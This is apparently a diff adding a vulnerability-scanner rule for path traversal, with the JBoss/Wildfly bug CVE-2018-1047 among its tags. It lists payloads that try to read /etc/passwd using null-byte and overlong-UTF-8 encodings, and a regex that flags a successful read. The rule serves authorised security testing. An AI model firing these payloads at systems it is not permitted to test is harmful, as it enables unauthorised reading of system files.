@@ -1,0 +1,30 @@
+generate:
+  - payload:
+    - ../../../../../../../../../etc/passwd
+    - ../../../../../../../../../etc/passwd%00
+    - ../../../../../../../../../etc/passwd\u0000
+    - ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+    - ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd
+  - method:
+    - postfix
+detect:
+  - response:
+    - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
+meta-info:
+  - type: ptrav
+  - threat: 80
+  - tags:
+    - Path Traversal
+    - Arbitrary File Reading
+    - Misconfiguration
+    - Directory Listing
+    - Insecure Direct Object References
+    - Broken Access Control
+    - OWASP
+    - OWASP Top-10
+    - A4:2010
+    - A4:2013
+    - A5:2017
+    - JBOSS
+    - Wildfly
+    - CVE-2018-1047 # TODO: more CVE references, it's a common bug. Or we need to split between classic and custom vectors
